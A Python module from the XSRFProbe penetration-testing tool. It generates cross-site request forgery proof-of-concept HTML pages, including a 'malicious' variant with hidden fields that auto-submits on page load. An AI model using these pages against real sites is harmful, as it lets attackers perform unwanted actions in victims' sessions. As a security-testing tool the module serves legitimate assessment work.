#!/usr/bin/env python3
# -*- coding: utf-8 -*-

#-:-:-:-:-:-:-::-:-:#
#    XSRF Probe     #
#-:-:-:-:-:-:-::-:-:#

# Author: 0xInfection
# This module requires XSRFProbe
# https://github.com/0xInfection/XSRFProbe

from core.colors import *
from ast import literal_eval
from bs4 import BeautifulSoup
from yattag import Doc, indent
from files.config import OUTPUT_DIR
from core.prettify import formPrettify
from core.prettify import indentPrettify

doc, tag, text = Doc().tagtext()

def GenNormalPoC(action, fields, method='POST', encoding_type='application/x-www-form-urlencoded'):
    """
     Generate a normal CSRF PoC using basic form data
    """
    print(GR, 'Generating normal PoC Form...' )
    verbout(color.RED, '\n +---------------------+')
    verbout(color.RED, ' |   Normal Form PoC   |')
    verbout(color.RED, ' +---------------------+\n'+color.CYAN)
    # Main starting which we will use to generate form.
    with tag('html'):
        with tag('title'):
            text('CSRF PoC')
        with tag('body'):
            with tag('h2'):
                text('Your CSRF PoC')
            # Try not messing with this part. (1)
            with tag('form', id='xsrfprobe_csrfpoc', action=action, enctype=encoding_type, method="POST"):
                for field in literal_eval(fields):
                    with tag('label'):
                        text(field['label'].title())
                    doc.input(name=field['name'], type=field['type'], value=field['value'])
                # Adding the Submit Button
                doc.stag('input', value='Submit', type='submit')
            doc.stag('br')
            # Brand tag :p ...I guess...
            with tag('small'):
                text('(i) This form was generated by ')
                with tag('a', href='https://github.com/0xinfection/xsrfprobe'):
                    text('XSRFProbe')
                text('.')
    content = BeautifulSoup(doc.getvalue(), 'html.parser')
    formPrettify(indentPrettify(content))
    print('')
    # Write out the file af...
    fi = open(OUTPUT_DIR+action.split('//')[1].replace('/','-')+'-csrf-poc.html', 'w+', encoding='utf8')
    fi.write(content.prettify())
    fi.close()
    print(G+'PoC successfully saved under '+color.ORANGE+OUTPUT_DIR+action.split('//')[1].replace('/','-')+'-csrf-poc.html')

def GenMalicious(action, fields, method='POST', encoding_type='application/x-www-form-urlencoded'):
    """
     Generate a malicious CSRF PoC using basic form data
    """
    print(GR, 'Generating malicious PoC Form...' )
    verbout(color.RED, '\n +------------------------+')
    verbout(color.RED, ' |   Malicious Form PoC   |')
    verbout(color.RED, ' +------------------------+\n'+color.CYAN)
    # Main starting which we will use to generate form.
    with tag('html'):
        with tag('title'):
            text('CSRF PoC')
        with tag('body'):
            with tag('script'):
                doc.asis('alert("You have been pwned!!!")')
            # Try not messing with this part. (1)
            with tag('form', id='xsrfprobe_csrfpoc', action=action, enctype=encoding_type, method="POST"):
                for field in literal_eval(fields):
                    if not field['value']:
                        val = input(C+'Enter value for form field '+color.GREEN+field['name'].title()+' :> '+color.CYAN)
                    doc.input(name=field['name'], type='hidden', value=val)
        # The idea behind this is to generate PoC forms not requiring any
        # user interaction. As soon as the page loads, the form with submit automatically.
        with tag('script'):
            # Try not messing with this part. (2)
            doc.asis('document.getElementById("xsrfprobe_csrfpoc").submit();')
    # Brand tag :p ...I guess...
    doc.asis('<!-- This form was generated by XSRFProbe (https://github.com/0xinfection/xsrfprobe) -->')
    content = BeautifulSoup(doc.getvalue(), 'html.parser')
    formPrettify(indentPrettify(content))
    print('')
    # Write out the file af...
    fi = open(OUTPUT_DIR+action.split('//')[1].replace('/','-')+'-malicious-poc.html', 'w+', encoding='utf8')
    fi.write(content.prettify())
    fi.close()
    print(G+'PoC successfully saved under '+color.ORANGE+OUTPUT_DIR+action.split('//')[1].replace('/','-')+'-malicious-poc.html')
